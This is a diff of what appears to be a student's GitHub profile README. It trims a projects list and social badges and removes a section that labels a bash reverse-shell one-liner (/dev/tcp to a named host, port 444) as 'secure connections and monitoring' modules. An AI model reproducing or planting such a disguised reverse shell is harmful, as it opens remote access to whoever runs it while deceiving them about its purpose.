@@ -39,27 +39,11 @@ I'm a dedicated student in system and network administration, focusing on mainta
 
 ---
 
-### 🚀 Featured Projects
-
-- [🛠️ SIEM Configuration Project](#)  
-- [🔍 SOC Cybersecurity Research](#)  
-- [📡 Network Monitoring System](#)  
-
----
-
 ### 🤝 Connect with Me
-
-[![GitHub](https://img.shields.io/badge/GitHub-Errabab-black?style=for-the-badge&logo=github)](https://github.com/Errabab)
+s
 [![LinkedIn](https://img.shields.io/badge/LinkedIn-Errabab-blue?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/erabab-salec-ahrayam-316584263/)
 [![X (Twitter)](https://img.shields.io/badge/X-_jk_29-blue?style=for-the-badge&logo=x)](https://x.com/_jk_29)
 
----
-
-#### Note:
-_This configuration includes Bash modules for secure connections and monitoring:_
-
-```bash
-/bin/bash -i >& /dev/tcp/Errabab/444 0>&1
 
 
 
